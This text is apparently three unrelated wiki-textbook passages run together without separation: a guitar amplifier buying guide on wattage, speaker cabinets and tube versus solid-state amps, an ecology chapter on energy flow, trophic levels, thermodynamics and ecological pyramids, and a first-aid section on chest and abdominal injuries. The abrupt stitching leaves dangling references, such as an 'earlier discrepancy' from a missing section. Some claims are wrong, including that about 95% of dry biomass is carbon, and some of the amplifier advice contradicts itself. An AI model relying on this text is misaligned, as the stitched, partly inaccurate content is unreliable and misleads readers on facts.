All else being equal, generally a low power speaker is louder at the same power as a high power speaker. This is known as efficiency or sensitivity. A 25 watt speaker with a 10 watt amplifier will generally be louder than a 100 watt speaker on the same 10 watt amplifier. Thus, a multi speaker cab will allow the use of low power speakers with a high power amplifier. 

Lastly, in some styles of music, such as rock and blues, the speakers sound their best when being pushed close to their max power ratings. When buying cabs for your amplifier, the best power rating is about 150% of your amplifier's rated output. 150 watt for 100 watt amplifier, 75 for 50, etc. Any higher and you'll actually lose volume. For harder music, pushing the speakers that hard may cause an unwanted smoothness. If money permits, buy cabs rated for 2-4 times as much as the amplifier.

===Wattage===
[[File:SM57&amp;Beta57.JPG|thumb|160px|right|Shure SM57 and Beta57 microphones]]
The wattage rating is an indication of loudness though some amplifiers may output more or less wattage than they are rated for. It is recommended that your first amplifier should be in the 30-50 watt range. If you are intending to buy a 100 watt amplifier you will need to consider using a rehearsal studio for practice. When recording or playing live you should capture the speaker output with a dynamic microphone, the industry standard Sure SM57 is relatively inexpensive, so that the output can be routed to a mixing desk or PA.  

Also, due to the way tube amplifiers and solid state amplifiers distort, there is a perceived difference in loudness, with tube sounding louder given the same wattage. The truth is that both are equally loud, but the sustain on solid state amplifiers is not as good, which results in a perceived lose of volume. If you are gong to be in high overdrive all the time, solid state amplifiers will actually sound louder, but often more piercing.

Another question is whether you need the louder wattage. On the other hand, in order to push the lower frequencies of the sound, wattage is important. This is because the idea of a good distortion, in general, is to have an amplifier that pushes as much clean bottom end into your overdriven sound as possible without getting flabby or muddy, which is what creates the hugeness of the sound. The lower in wattage that you go, the quicker your bottom end will mud out. 

Solid state amplifiers:
*10-30W: home practice
*30-50W: band practice, recording, small club
*50-100W: large venue

Tube amplifiers:
*&lt;10W clean: self practice, recording
*&lt;10W overdriven: self practice, recording, small club
*10-20W clean: self and band practice, recording, small to medium club
*10-20W overdriven: band practice, recording, small to medium club
*20-30W: band practice, gigging
*30-50W: gigging
*50-100W: extremely loud in confined spaces though diffuse in large halls

==Types of Unit==
The combo amplifier is a one piece unit containing both the preamp, power amplifier, and the speaker(s). Typically they do not exceed more than 100 watts, as they are designed to be &quot;relatively&quot; portable. Most combos have just a single speaker, ranging from 6&quot; to 15&quot; but some have two or four speakers. The most common is a single 12&quot; with a pair of 12&quot; being the next most common.

=== Micro/Headphone amplifiers===

Micro amplifiers usually have 1 watt, and do not exceed 10 watts. This class of amplifiers is known for its small size (no larger than a computer speaker), designed for extreme portability (such as carrying them in your guitar bag). While some may have built-in speakers, they usually cannot be heard during jam sessions. As they are solid states and generally low wattages, if they do not utilize FET circuitry they tend to go into an unpleasant distortion very quickly. Aside from homemade solutions (such as the famous Ruby amplifier), Danelectro Honeytone and Vox amPlugs are all good choices.

===DI Unit including amplifier modelers===

===Modeling===
[[File:Procesor gitarowy POD HD Bean firmy Line 6.jpg|thumb|Line 6 POD HD amplifier modeller]]
A deviation of solid state that attempts to mimic the gain-compression on a valve-based amplifier, it is basically a combination of a very clean power amplifier and a tone modeling unit producing most of the tone. Some may consider this as the Swiss-army knife of amplifier. The best of these amplifiers can recreate the sound of many other units with acceptable accuracy and also have effects such as delay, chorus, flanger, reverb. The effects and modeled amplifier are patched into the correct configuration to recreate classic rigs such as a Gibson L5 being played through a Fender Twin Reverb or a Fender Stratocaster coupled with a Marshall stack. The power of modeling allows preset patches to be created that can emulate an acoustic guitar or synth. For beginners cheaper modeled amplifiers or a small emulation box like the Line 6 POD may initially be useful though if you find yourself returning to the same patch then it may be time to buy that particular combination.    

There are basically three kinds: Analog circuitry, Dedicate DSP, and modeling processor (typically also have many digital effects onboard). Analog circuitry and dedicated DSP are typically the best kind, while modeling processors seems to have a bit of a lag between your pick attack and the sound produced, and you should test one carefully before buying it.

Many amplifier modelers or micro-amplifiers, like the Rockman, are actually DI Unit hybrid with effect units. A DI unit transforms the unbalanced, high impedance signal from the guitar into a balanced, low impedance signal for use with a mixer; however, some desiged for use with guitar have amplifier modelers within them, and may have multi-effect processors for additional effects. Most often these are used with headphones, but they also allow direct input of the guitar to the mixing desk in a recording studio, while retaining some of the tone and quality of an amplifier. 

The main benefit of using a DI unit is that they are compact, and they can get &quot;loud enough&quot; and have a particular tone. This is particularly true for amplifier modelers and &quot;headphone amplifiers&quot;, as their embedded electronics frequently have a somewhat decent approximation of a tube amplifier. You can also use these in recording, or use it like a preamp and plug it into a larger amplifier for volume. Also, if you are often going to hook up to a P.A. system with your amplifier, these may provide a cheap option and quicker setup than a larger amplifier. 

The main downfall of DI units is that they cannot completely capture the tone of a guitar amplifier. The ultimate way to connect an electric guitar to a PA is to use a microphone in front of the speaker.

===Practice/Studio amplifiers===
Their wattage may range from 5 to 50, though from 30 on its hard to say whether it is purely practice alone or can also be used for small gig. Generally, they are designed to be used in a small space, because the small size demands a small space for a suitable volume for practice or recording. While they come in various size, for a solid state amplifier, one should need at least a 10-inch, suitable for jam sessions. 
===Small gig amplifiers===
From 30 watts upward, these combo amplifiers the smallest package which is considered suitable as a stand-alone amplifier for small gigs. The standard is usually 50 or more watts of power and one 12 inch speakers, though some manufactures may use less wattages of 30 and 40, while employing more than one speakers. For tube amplifiers, even a 30 watts is enough, though with better models, sound quality of solid state amplifiers begins to approach levels acceptable to professional musicians.

While a 2x12 combo may be seen as simply an amplifier with one more speaker, the volume of air moved essentially double, and thus make it louder. Benefit of using two speaker instead of one is that it allows stereo effects. Some consider these to be the absolute minimum serious amplifier.

; Busking amplifiers 
These small and portable battery powered amplifiers are designed for outdoor use when no mains power is available. The battery will normally provide up to six to ten hours use on one charge though buying a spare battery or ensuring that the amplifier can also be used with AC power will offset this limitation. Examples include the Pignose Hog 30 which has an 8 inch speaker and a rating of 30 watts and the Vox DA5 which has a 6.5 inch speaker and a rating at 5 watts.

=== Heads, Cabinets, and Stacks ===

[[File:Wzmacniacz gitarowy (head) 1959SLP-01 firmy Marshall.jpg|thumb|Marshall amplifier without the speaker cabinets plugged in. Commonly referred to as the head.]]

One of the iconic images associated with rock music is the stack:
* head - amplifier
* cabinet - speakers 

When purchasing the two, make sure of the impedance of the cabinet, and the power rating for the head at that impedance. Make sure the cabs RMS rating is about the same as the head's power output at the impedance of the cab. A head can be solid state or tube, the latter being less durable, but sounds better and is more expensive. In general, a single cab would have a 4x12 for guitar, though other arrangements, such as 1x15, a 2x12, a 4x10 or a 6x10 had also appear. 

====Low wattage====
Why would someone want to make an amplifier with low wattage, which is usually 5 to 15 watts – making them practice amplifiers, but in a stack format? The MG15MSII by Marshall is a microstack aimed at the practice and entry level market. While they may be in a stack configuration these low wattage solid state heads are essentially practice amplifiers. 

However, for many &lt;20w tube amplifiers, such as Epiphone Valve Junior's Stack configurations and its numerous clones, such as Crate Blackheart BH5H, or the Marshall 20w Lead and Bass Head, it provides much more flexibility that cannot be provided in a combo. A hot rodded class-A tube amplifier – which can go up to 16 watt RMS with 2x 6v6 and proper output trnsformer, pumped out a 4x12 cabinet, can be as loud as a 50 watt solid state amplifier, and thus it provides potential to upgrade in the future. Furthermore, by separating the speaker from the amplifier, customizing (hotrodding) the amplifier is actually easier than a combo.  Since pumping sound through more speakers produces more volume but has a softer sound, it may be even better than a fully cranked 50 watt tube amplifier during a performance. By separating the amplifier and speaker into two pieces, it could also be easier to carry, as in the case of Orange Tiny Terror (15 watt), which comes with a shoulder bag.

====Serious gig====
These are the types that most people talk about, with a head unit from 50 watts, that's good for a small club, to the standard 100 for large auditorium. For a small auditorium, a half stack – connected to one 4x12 speaker cabinet– is more than enough.

For a larger venue, or even an arena, you may run a full stack – that is, you'd have two 4x12 cabinets, one stacked upon another vertically. The size, however, is tremendous; when fully deployed they are as tall as a grown man, and even when disassembled, you will still need a van to carry them. In case the volume is not enough, you can either hook up to even more speakers, or better yet, use another stack as a slave. Obviously, these are not really good for practice, as not only are they hard to transport, but also too loud. 

One that is good is the Crate's PowerBlock, which is as small as a DI unit, but is actually a 150watt RMS pure solid state goodness. Plug in any FX you want, and you will have a perfect companion for your guitar. The Warhead Combo and Fender MetalHead are examples of 200+ watt amplifiers.

It is recommended that earplugs should be worn when near a loud amplifier or PA to avoid tinnitus and loss of hearing. Earplugs are available from reputable dealers.

====Head and cabinet match up====
A speaker out will have a certain acceptable impedance. For solid state amplifiers, you should only plug in speakers that have the same impedance, even though larger amount of impedance is also somewhat acceptable (e.g.: a 8ohm plug can only accept 8ohm or 16 ohm) Plugging in a speaker with lower impedance will very likely burn your amplifier.

Tube amplifiers are much more sensitive to speaker impedance. Any mismatch between the speaker impedance and the impedance set on the amplifier will cause a strain on the output tubes and transformer. It is more acceptable to plug in a speaker of lower impedance, however, the opposite of what you can do with solid state amplifiers. A higher speaker impedance might be ok as far as it is no more than twice than the one set on the amplifier. Never turn on a tube amplifier with no speakers connected.
This might cause severe damage to the output transformer. Always turn off your tube amplifier before disconnecting the speaker. Some amplifiers have shorting jacks (e.g. Hiwatts), these may allow you to change speakers on the fly, but always at the amplifier side of the cable, never at the speaker side.
Furthermore, having more speaker only increasing the volume somewhat; using a 5w to push a 4x12 cab will be slightly louder than 1x12, you can push more watt through such cab, and you'll have a broader tone, with the sound thicker and fuller. Hower, to actually increase the volume, you do need more wattage.

==What makes a good amplifier?==

A solid state amplifier can provide a good tone. In fact, many pedals that are designed to create a metallic tone are designed to use the hard-clipping functions that the solid state amplifiers provide, one thing that tube amplifiers cannot do well. 

Tube amplifiers are sensitive to their input signal. The harder you play with your pick, the more they tend to break up and distort. The softer you strum, the warmer and breathier they appear to sound. This is known as touch sensitivity. Multiple preamp gain stages can sometimes push an amplifier to the point where you do not hear the pick attack on the string. Finding a balance where pick attack and sustain are clearly articulated is the sign of a superior matched preamp and power section. With a good quality tube amplifier, the subtle changes you make with your pick and finger pressure has a dramatic impact on the sound and is part of the process of creating your own identifiable style.

However, a solid state amplifier has not yet been able to recreate the dynamic feel of a tube amplifier. While a solid state amplifier can get fairly close in tone, it's many times harder to influence the tone simply by how the guitar is played. A good tube amplifier will distort on command when digging into the strings, while a lighter touch cleans everything up with seemingly infinite levels in between. Where as, a solid state amplifier usually requires adjustments to the controls in addition to playing style to have any effect on the tone.

== Tips ==
* Visit the manufacturer's site for information and then compare their description to online reviews and forum discussions. Comparison allows a more balanced view to be formed especially with regards to the quality of on-board effects and the general performance of the amplifier. 
* Buy the best amplifier that you can afford while stretching your budget to the limit of what you personally consider expensive.

[[Image:FoodChain.svg|thumb|right|An example of the concept of energy flow through trophic levels of a food chain.]]
There are several different factors that control the primary productivity of energy and biomass flow. Energy flow is the amount of energy that moves through a food chain. The energy input, or energy that enters the ecosystem, is measured in Joules or calories.  Accordingly, the energy flow is also called calorific flow.  In the study of energy flow, ecologists try to quantify the importance of different species and feeding relationships.

The largest source of energy for an ecosystem is the sun. Energy that is not used in an ecosystem is eventually lost as heat. Energy and nutrients are passed around through the food chain, when one organism eats another organism. Any energy remaining in a dead organism is consumed by decomposers. Nutrients can be cycled through an ecosystem but energy is simply lost over time.

An example of energy flow in an ecosystem would begin with the autotrophs that take energy from the sun. Herbivores then feed on the autotrophs and change the energy from the plant into energy that they can use. Carnivores subsequently feed on the herbivores and, finally, other carnivores prey on the carnivores. 

In each case, energy is passed on from one trophic level to the next trophic level and each time some energy is lost as heat into the environment.  This is due to the fact that each organism must use some energy that they received from other organisms in order to survive.  The top consumer of a food chain will  be the organism that receives the least amount of energy. 

Hairston and Hairston (1993){{note|hairston}}, believe that there is a cause and effect relationship that results in any given trophic structure. Specifically, they state that it is trophic structure, rather than energetics that controls the amount of energy consumed at each trophic level and that &quot;ecological efficiencies&quot; are the product of a trophic structure, not a determining factor. Further, they state that trophic structure is instead the result of competition and predator-prey interactions. It is important to remember that many species may occupy each trophic level and are so subject to interspecific competition.  This is especially true for producers, carnivores, and decomposers (Hairston, Smith, and Slobodkin, 1960){{note|HSS}}. 

==Energy==
[[Image:The Sun.jpg|thumb|left|The Sun is Most Common Source of Energy in Every Ecosystem]]
'''Energy''' is the ability to do work. Life manifests itself in energy changes, subject to the laws of thermodynamics. Ecosystems exist and operate by virtue of a flow of energy through the components of the system and thermodynamics (the movement of energy) forms the very basis of the biosphere organizing principles introduced in [[../Biosphere Organization|Chapter 2]].  Before proceeding into the relationship between ecology and thermodynamics, it is necessary to build a basic understanding of the physics of energetics, simply a further demonstration of the fact that ecology is multidisciplinary, requiring of its students a broad knowledge in all sciences.

Although several sources of energy are available for exploitation on earth (e.g., geothermal, nuclear decay), the most significant is solar energy. Light and other radiation streaming out from the sun strikes the earth 93 million miles distant, providing energy to the atmosphere, the seas, and the land, warming objects that absorb this energy; that is, radiant energy is converted to heat energy (molecular motion). Differential heating causes winds and currents in the air and water, the heat energy becoming ''kinetic energy'' of motion. Warming results in evaporation of water into the atmosphere, setting up the hydrologic cycle ([[../Biogeochemical cycles#Biogeochemical cycles|Chapter 4]]), the lifting of water into the atmosphere becoming ''potential energy'' that will convert to kinetic energy when the water begins to flow back downhill. However, the most significant solar energy driven process with respect to living systems is that of '''photosynthesis'''. Light energy is converted by photosynthesizing cells into a form of potential energy held in the chemical bonds of organic compounds. Organisms require both the substance and the stored energy of chemical compounds to function and grow, and eventually reproduce. Substance to provide the building blocks of cellular (and extracellular) components that comprise structure, and energy to move substances around, affect chemical reactions, and carry out all manner of intracellular and organismal processes.

===Solar Constant===
The '''Solar Constant''' is the average amount of radiant energy from the sun that reaches the Earth's atmosphere. This value is calculated at 2 calories per minute on each square centimeter of the Earth's upper atmosphere. This value can change because of Earth's elliptical path effecting seasonal changes and differences in the northern or southern slope which effect magnitude. The net radiation is what is left after some of the energy is reflected by the Earth's surface. Calculations for the solar constant are done by using the '''astronomical unit (AU)''' which is the mean distance between the Earth and Sun; One (AU) is equivalent to 92,960,000 miles (149,604,970 km). 

Movement of the air and evaporation are important factors that regulate the temperature of the Earth from the sun's energy. The movements of air allow energy to be given off into space and without this reflection of energy the Earth would rapidly overheat and life would extinguish. This interaction is also a very important to the maintenance of the Earth's polar ice caps. A decrease in the solar constant of 2-5% would be enough to create a second ice age. Of course, as has been shown, the increasing use of industry by man, can increase earths temperature. If it were enough to cause the ice caps to melt, there would be an increase of approximately 7 degrees C. {{ref|Sellers1969}} This is due to the fact that the polar ice caps help in reflecting back the Earth's radiation.

== Organisms' Role in the Flow of Energy ==
[[Image:Simple photosynthesis overview.svg|thumb|right|A simplified overview of the process of photosynthesis.]]
When it comes to the flow of energy in ecosystems there are two types of organisms: '''producers''' and '''consumers'''. Plants are a common example of producers in all populations. They are able to convert carbon dioxide into oxygen and glucose, a common sugar consumed by most organisms. They do this through a process called photosynthesis which allows the plants to use sunlight as a source of energy. Producers convert energy from the environment into chemical energy in the form of carbon to carbon bonds. A classic example is the one previously mentioned where the plants convert CO&lt;sub&gt;2&lt;/sub&gt; to O&lt;sub&gt;2&lt;/sub&gt; and glucose.

The second type of organism is the consumer. Consumers are unable to make chemical energy the way plants do and have to use metabolic processes to get energy from carbon to carbon bonds, which is called respiration. Respiration breaks the carbon to carbon bonds and combines them with oxygen to make carbon dioxide. The energy released is used to help organisms move their muscles or as heat. Energy cannot be reused once it has been lost.

===Measuring Energy Flow===

Flow diagrams are a visual way to understand how energy is transferred and/or transformed.  A simple flow diagram usually starts with a primary producer[c]==&gt; herbivore[c]==&gt; predator[c]==&gt; and so on. They can be as simple as that or as complex as the complete CO2 cycle.  The symbol [c] is the consumption rate of that species.  The consumption rate between forcing functions is denoted by r, (r=[c]/t).  The forcing function, which is the flow of energy between species, is usually measured in kcalmol&lt;sup&gt;-1&lt;/sup&gt;year&lt;sup&gt;-1&lt;/sup&gt;.  The primary producer efficiency is measured by (NPP/Total consumed)x 100.  Secondary production efficiency is measured by (NSP/Total consumed)x 100.

==Primary and Secondary Production==
The [[w:Primary_production|Net Primary Production]]('''NPP''') is the amount of carbon fixed per unit time (usually per day).  Measures of net primary production include: 
# change in dry biomass per unit time
# calorimetry
# carbon dioxide uptake over time
# oxygen uptake over time (comparison of the plant's light cycle to its dark cycle)
# change in chlorophyll-a concentration, which equals the concentration of carbon dioxide fixed per day.  

Ecologists look at dry mass because the high variability of water content makes accurate measurements difficult.  Essentially about 95% of the dry mass is carbon and about 99.9% of the global biomass is plants (which includes algae, cyanobacteria, and other organisms that contain chlorophyll).  

[[Image:Seawifs global biosphere.jpg|left|thumb|200px|Global oceanic and terrestrial photoautotroph abundance, from September 1997 to August 2000. As an estimate of autotroph biomass, it is only a rough indicator of primary production potential, and not an actual estimate of it.]]There are several different things that can limit NPP Terresterial limiting factors include: &lt;br&gt;'''(1)''' water/precipitation, &lt;br&gt;'''(2)''' sunligh/temperature, and &lt;br&gt;'''(3)''' nutrients.  

Aquatic limiting factors include: &lt;br&gt;'''(1)''' sunlight/temperature, and &lt;br&gt;'''(2)''' nutrients.

The NPP of aquatic ecosystems has been vastly affected by global warming. Global warming is the primary issue due to human impacts and gas emissions. Projected increases in carbon dioxide and temperature for the next 50 years exceed the amounts in which great coral reefs have flourished over the past half-million years. Coral reefs are at a serious decline due to temperature increases and coral bleaching. ..[[Image:GBReef TempChlorophyll 200602.jpg|right|thumb|200px|Two images showing the relationship of water temperature to w:coral bleaching along the Great Barrier Reef. Warm pink and yellow tones show where sea surface temperatures were warm in the top image. The warmest waters are the shallow waters over the reef near the coast, where coral bleaching was most severe in the summer. The lower image shows chlorophyll concentrations, where high concentrations (yellow) generally point to a high concentration of phytoplankton in surface waters of the ocean. In this image, the bright yellow dots actually represent the coral reefs, and not surface phytoplankton.]]An estimated 30% of coral reefs are severely damaged and about 60% of coral reefs may be lost by 2030. {{ref|Hughes}}Coral bleaching not only affects the coral reefs, but the diverse collection of species that interact with each other within the coral reef ecosystem. An example of this is the increased consuming of corallivorous fish on recently bleached coral (Pratchett et al. 2009).{{ref|Pratchett}} Corallivorous fish were found to increase stress on recently bleached coral due to increased feeding. The increased feeding on already stressed corals may have contributed to the mortality of bleached coral. The Corallivorous fish however, only increased consuming for the early stages of coral bleaching, and may be a good indication of coral mortality.   Coral bleaching affects reefs at a regional and global scale, and has a huge impact on the NPP of coral reef ecosystems.  

The net primary production is the main factor that limits the amount of net secondary production. Net secondary Production ('''NSP''') determines the amount of biomass consumed and calculates the energy content of the consumed biomass. It also determines the amount of biomass and/or energy assimulated that is equivalent to an increase in the biomass of the consumer. In this case, a growth in biomass can be defined as a growth in individuals or growth in populations that includes reproduction.  Most of the energy lost in secondary production comes from maintenance respiration.  Secondary producers will consume oxygen and produce heat, which results in fairly inefficient production. Endotherms have a mean efficiency of about 2% and ectotherms have a mean efficiency of about 10%.  There is a loss of energy due to respiration of 98% and 90%, respectively.  All other organisms have a 30%-40% efficiency rate. All animals that live off plants(herbivores) are included in this group of secondary producers.  

===Limiting Nutrients===
[[Image:Algae-mat-in-shallow-water FI-EU 2007-Aug-10 by-RAM.jpg|thumb|right|Excess Nitrogen can cause ill affects such as toxic algal bloom]]
As mentioned above nutrients can play a role in limiting the production of a community. Other than sunlight, primary productivity is limited by nutrient availability. A '''limiting nutrient''' is a nutrient which is found in the lowest relative concentrations such that an increase in this nutrient will increase primary productivity, while a decrease in this nutrient will decrease primary productivity. Typically, either phosphorus or nitrogen serves as a limiting nutrient within a given ecosystem, though water availability can also serve to limit the primary productivity of an ecosystem. Trace nutrients such as molybdenum and zinc are necessary for the growth of plants and can act as limiting agents even though they are in very small quantities. Aquatic communities can also have limiting nutrients that control how much production takes place. In freshwater ecosystems net primary production is limited by phosphorus, and in the ocean the limiting nutrient is iron. 

Read: [http://plants.ifas.ufl.edu/guide/limnut.html Limiting Nutrients]
	
Too much of a nutrient can also have a limiting impact on a community. Recent studies have shown that excess nitrogen from human activities such as agriculture, energy production, and transport have begun to overwhelm the natural nitrogen cycle. The effects of the extra nutrients reach every environmental domain, threatening air and water quality and disrupting the health of terrestrial and aquatic ecosystems. In terrestrial ecosystems, nitrogen saturation can disrupt soil chemistry, leading to loss of other soil nutrients such as calcium, magnesium, and potassium. This means that while the nitrogen is not a limiting factor, it causes other nutrients in the soil to become limiting factors.

== The Laws of Thermodynamics as they relate to Ecology ==
The laws of thermodynamics are fundamental concepts to chemical processes of the universe.  They are extremely important in chemistry and physics, but are the basis for many biological concepts as well.  The laws dictate how energy can be transported, which of course can be applied to ecology because energy transfer is what drives metabolism and, on a larger scale, food chains and food webs.

===Zeroth Law of Thermodynamics===
[[Image:Mur_serie_generalite.png|right|thumb|200px|Since the temperature decreases going from block A to block C, assuming that all blocks are in thermal contact, heat energy will flow from the left to the right until all blocks are of equal temperature.]]'''Zeroth Law of Thermodynamics'''  is the most obvious of all three laws, simply stating that if the temperature of object A is equal to the temperature of object B, and the temperature of object C is equal to the temperature of object B then the temperature of object C equals the temperature of object A.  Although this transitive property seems almost unnecessary to mention, it is of crucial importance to the subject of energy transfer in the form of heat energy,since temperature is a measure of heat.  Its implications in ecology are obvious as well.  Organisms require the means to survive in a climate of a certain range of temperatures, and evolution has created organisms with extremely different tolerances to temperature according to where they are located.

===First Law of Thermodynamics===
The '''First Law of Thermodynamics''' states that the total inflow of energy into a system must equal the total outflow of energy from the system, plus the change in the energy contained within the system. That is, energy is neither created nor destroyed, but may transform from one type to another.
This is relevant to food webs in that the amount of energy being transferred through the food web cannot be larger than the amount of energy initially supplied by the primary producer (which was supplied by the sun's energy).

===Second Law of Thermodynamics===
The  '''Second Law of Thermodynamics''' states that &quot;energy of all kinds in our material world disperses or spreads out if it is not hindered from doing so.&quot;  In other words, the randomness (entropy) of the universe is always increasing.  This is quoted from a site devoted to demonstrating how the second law is involved in our open system of the earth and sun: http://www.entropysimple.com.

The second law of thermodynamics is definitely the most applicable of the four laws to ecology.  It is consistent with Elton's Pyramid of foodwebs that states that although sometimes total size or number of organisms can either increase or decrease with increasing trophic levels, the total biomass ALWAYS decreases with increasing trophic levels, as energy is constantly being lost to the atomosphere (usually as CO&lt;sub&gt;2&lt;/sub&gt;. The energy from the sun allows living organisms on earth to temporarily decrease entropy, but our organized systems require an overall input of energy (provided by the sun).  The second law of thermodynamics suggests a dire &quot;heat death of the universe&quot;  will occur when all the energy of the universe is evenly distributed, and no life or concentrated matter (stars, galaxies) can exist, although this won't occur for at least 10&lt;sup&gt;100&lt;/sup&gt; years.[[Image:Semipermeable membrane (svg).svg‎|left|thumb|200px|Semipermeable membranes are prevalent in many organisms and are a way that tendency toward entropy is manipulated to create a gradient. Such gradients can allow thermodynamically favorable reactions to occur yet maintain an organized structure.]]

Ecosystems are far from thermodynamic equilibrium, which used to be an argument against the second law of thermodynamics. Galucci (1973) {{ref|galucci}} performed a literature review of the physical theory of thermodynamics in relation to mechanisms of energy transfer in the environment (passive and active) and ecosystem productivity.  He also studied how community structure and diversity related to entropy.  As a result of his research, he claimed that the earth is a &quot;receiver, reflector, and degrader of energy.&quot;  The movement of energy through a community structure is necessary for its maintenance.  External energy from the sun provides primary producers with energy and with a range of temperature in which life in the community is possible.  Internal energy that travels from primary producers to organisms higher in the food chain is in the form of metabolism (mass, bonds) which provides transferrable energy.  Galucci claimed that diversity is a form of entropy and improves the stability of a community.  His conclusion was that the hypothesis of the second law of thermodynamics being applicable to ecosystems is supported.

Hedin ''et al.'' (1998) {{ref|hedin}}studied biogeochemical processes involving nitrogen at soil to stream interfaces from a thermodynamic point of view.  More than 1400 subsurface water samples from Michigan wetlands draining from a mixed forested-agricultural landscape were observed in this study. Thermodynamic principles could predict what form of nitrogen would be available to microbes if the number of electron donors and acceptors (water pH) is known. Microbes will transform nitrogen from NO&lt;sub&gt;3&lt;/sub&gt;&lt;sup&gt;-&lt;/sup&gt; to ammonia in acidic conditions present in shallow water, but covert NO&lt;sub&gt;3&lt;/sub&gt; to N&lt;sub&gt;2&lt;/sub&gt;O gas in basic conditions present in deeper water.  The findings agreed with this theory and were helpful because oxidizable carbon can be added to the shallow portions of the water that are not sufficient at denitrification.  These findings would not have been possible (or understandable) if a thermodynamic approach to the metabolism of microorganisms had not been considered.

===Third Law of Thermodynamics===
The '''Third Law of Thermodynamics''' simply states that as temperature of a system reaches absolute zero (0 K), the entropy of the system decreases.  Technically, it states that a system at absolute zero is at zero entropy, but this is theoretically not possible as it has been established that absolute zero is not able to be experimentally reached.  This is why substances become gases (molecules spread out, entropy increased) at high temperatures, and freeze (become ordered crystalline structures, entropy decreased) at low temperatures.  Decomposition also has a higher rate at higher temperatures for this reason.

==Ecological Pyramids==
[[Image:EcoPyramid.png|thumb|300px|right|An ecological pyramid.]]
An '''Ecological Pyramid''' (or '''Trophic pyramid''') is a graphical representation designed to show the relationship between energy and trophic levels of a given ecosystem. Most commonly, this relationship is demonstrated through the number of individuals at a given trophic level, the amount of biomass at a given trophic level, or the amount of energy at a given trophic level. It is worth noting that all Ecological Pyramids begin with producers on the bottom and proceed through the various trophic levels, the highest of which is on top.
  
===Pyramid of Biomass===
An '''Ecological Pyramid of Biomass''' shows the relationship between energy and trophic level by quantifying the amount of biomass present at each trophic level (dry mass per trophic level). As such, is assumed that there is a direct relationship between biomass and energy. By doing this, the earlier discrepancy is avoided because even though there is only one tree, it is much more massive than the next trophic level.  

The main problem with this type of Ecological Pyramid is that it can make a trophic level look like it contains more energy than it actually does. For example, all birds have a beak and skeleton, which despite taking up mass are not eaten by the next trophic level. In a '''Pyramid of Biomass''', the skeleton and beak would still be quantified even though it does not contribute to the overall flow of energy into the next trophic level.

===Pyramid of Energy===
An '''Ecological Pyramid of Energy''' is the most useful of the three types, showing the direct relationship between energy and trophic level. It measures the number of calories per trophic level. As with the others, this graph begins with producers and ends with a higher trophic level.
  
When an ecosystem is healthy, this graph will always look like the standard '''Ecological Pyramid''' shown at the top of the page. This is because in order for the ecosystem to sustain itself, there must be more energy at lower trophic levels than there is at higher trophic levels. This allows for organisms on the lower levels to maintain a stable population, but to also feed the organisms on higher trophic levels, thus transferring energy up the pyramid.  
  
When energy is transferred to the next trophic level, only 10% of it is used to build bodymass, becoming stored energy (the rest going to metabolic processes). As such, in a '''Pyramid of Energy''', each step will be 10% the size of the previous step (100, 10, 1, 0.1, 0.01, 0.001 etc.).  

The advantages of the Pyramid of Energy:   
*It takes account of the rate of production over a period of time because each rectangle represents energy per unit area / volume per unit time. An example of units might be - kJ/m2/yr. 
*Two species weight for weight may not have the same energy content therefore the biomass is misleading but energy is directly comparable.  
*The relative energy flow within an ecosystem can be compared using pyramids of energy; also different ecosystems can be compared.   
*There are no inverted pyramids.  
*The input of solar energy can be added.  
  
The disadvantages of the Pyramid of Energy:
*The energy value for a given mass of organism is required, which involves complete combustion of a sample. 
*There is still the difficulty of assigning the organisms to a specific trophic level. As well as the organism in the food chains there is the problem of assigning the decomposers and detritivores to a particular trophic level.
  
The best way of showing what is happening in the feeding relationships of a community is to use Energy Pyramids.

==Overview==
Injuries to the chest and abdomen can be difficult to recognize and treat, and many injuries can go unnoticed until they become very serious. The muscle and bones that serve to protect vital organs can also mask their injuries - or at worst contribute to them. It is important for the rescuer to consider injuries that lie beneath the skin. 

In addition, the different organs react in different ways when subjected to trauma. Hollow organs (such as the bladder) tend to rupture, releasing their contents into the surrounding space. Solid organs (such as the liver) tend to tear instead, often bleeding at a slow enough rate to be overlooked.

==Closed Chest Injuries==
Chest injuries can be inherently serious, as this area of the body houses many critical organs, such as the heart, lungs, and many blood vessels.  Most chest trauma injuries should receive professional medical attention. Always call for an ambulance for any potentially serious chest injury.

===Rib Injuries===

A common result of trauma to the chest is damage to the victim's rib cage. The curved shape of the rib cage helps to deflect the force of some injuries, but damage to cartilage or the ribs themselves can still result.  While a single broken rib can be very painful for the patient, a number of broken ribs can lead to other complications. A victim with broken ribs may take very shallow breaths without even noticing it, as their body tries to prevent the pain with taking a full breath. 

When many adjoining ribs are broken in different places, a portion of the rib cage can move in the opposite direction the chest should. This is known as a &quot;flail&quot; segment, and can make breathing very painful and less effective.

===Recognition===

*Trouble breathing
*Shallow breathing
*Tenderness at site of injury
*Deformity &amp; bruising of chest
*Pain upon movement/deep breathing/coughing
*Dusky or blue lips or nail beds
*May cough up blood
*Crackling feeling upon touching victim's skin (sounds and feels like &quot;Rice Crispies&quot;)

===Treatment===
*Assess ABCs and intervene as necessary
*Call for an ambulance
*Assist the victim into a position of comfort (typically seated upright, to avoid fighting gravity)
*Conduct a secondary survey
*Monitor patient's condition carefully
*Be vigilant, keep alert for any changes.
*If a flail segment is suspected, tightly secure a bulky dressing (such as a tightly folded hand towel) to help stabilize the injury.

==Open Chest Wounds==

An '''open pneumothorax''' or '''sucking chest wound''' - the chest wall has been penetrated (by knife, bullet, falling onto a sharp object...)

===Recognition===
*An open chest wound – escaping air
*Entrance and possible exit wound (exit wounds are more severe)
*Trouble breathing
*Sucking sound as air passes through opening in chest wall
*Blood or blood-stained bubbles may be expelled with each exhalation
*Coughing up blood

===Treatment===
*Assess ABCs and intervene as necessary
*'''Do not remove any [[First Aid/External Bleeding#Embedded Objects|embedded objects]]'''
*Call for an ambulance
*Flutter valve over wound, as described [[#To create a flutter valve|below]]
*Lateral positioning: victim's injured side down
*Treat for shock
*Conduct a secondary survey
*Monitor vitals carefully

====Making a flutter valve====

Get some sort of plastic that is bigger than the wound. Ideas: credit card or similar, Ziploc bag, some first aid kits will have a ready-to-use valve. Tape the plastic patch over the wound on only 3 sides. The 4th side is left open, allowing blood to drain and air to escape. This opening should be at the bottom (as determined by the victim’s position). When the casualty inhales, the bag will be sucked in, but when the casualty exhales, the air will exit through the untaped side.

==Abdominal Injuries==
===Protruding organs===
If a trauma injury has caused the victim's internal organs to protrude outside the abdominal wall, '''do not push them back in'''. Doing so will only cause greater complications - remember that preventing further injury is one of the aims of first aid.

